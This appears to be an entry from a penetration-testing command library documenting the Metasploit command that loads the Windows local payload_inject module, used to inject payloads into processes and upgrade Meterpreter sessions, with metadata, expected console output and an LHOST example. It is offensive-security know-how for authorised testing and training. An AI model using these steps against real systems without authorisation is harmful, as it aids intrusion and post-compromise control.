---
id: 8fb6186d-4b5a-4e9e-a1a0-0df0e9a27c27-part1
name: metasploit-use-payload-inject-module
type: command
executor: metasploit
data: use exploit/windows/local/payload_inject
output: |-
  msf6 > use exploit/windows/local/payload_inject
  msf6 exploit(windows/local/payload_inject) >
created_at: '2019-11-14T01:00:13.488117+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - metasploit
  - module-load
verified: true
validated: true
---

# Metasploit Use Payload Inject Module

## Command

```metasploit
use exploit/windows/local/payload_inject
```

## Description

This command loads the Metasploit module for injecting payloads into local Windows processes, useful for migrating or upgrading Meterpreter sessions to 64-bit architecture from a backgrounded session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Module path is fixed | No |

## Examples

### Basic Usage

```metasploit
use exploit/windows/local/payload_inject
```

Loads the module; follow with `show options`.

### Advanced Usage

Load and immediately set options: `use exploit/windows/local/payload_inject; set LHOST <ip>`.

## Expected Output

```
msf6 > use exploit/windows/local/payload_inject
msf6 exploit(windows/local/payload_inject) > 
```

Prompt changes to indicate module is loaded.

## Related

- [[commands/metasploit-set-session-id]]
- [[procedures/upgrade-windows-meterpreter-x32-to-x64]]
